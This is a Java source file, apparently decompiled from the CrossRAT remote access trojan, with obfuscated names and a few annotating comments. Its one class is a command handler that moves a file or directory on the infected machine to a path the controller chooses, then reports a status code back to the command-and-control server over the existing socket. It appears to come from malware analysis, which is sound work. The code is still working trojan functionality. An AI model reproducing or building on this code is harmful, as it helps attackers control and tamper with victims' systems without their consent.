package crossrat;

import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;

final class h extends Thread {
    private String a;
    private String b;
    private String c = null;

    public h(String var1, String var2) {
        this.a = var1;
        this.b = var2;
    }

    public final void run() {
        File var1 = new File(this.a);
        File var2 = new File(this.b);
        DataOutputStream var3 = null;

        try {
            var3 = new DataOutputStream(k.k.getOutputStream());
        } catch (Exception var7) {
            var7.printStackTrace();
        }

        if (var1.exists()) {
            try {
                org.a.a.a.b.b(var1, var2);
                // success to rename path (move directory or file to var2)
                this.c = "1";
            } catch (IOException var6) {
                // failed due to exception
                this.c = "0";
                var6.printStackTrace();
            }
        } else {
            // already existing file or dir that's name is var2
            this.c = "2";
        }

        try {
            // send state code to server
            var3.writeBytes(k.g + k.d + k.F + k.d + this.c + k.d + "&&&");
        } catch (Exception var5) {
            var5.printStackTrace();
        }
    }
}
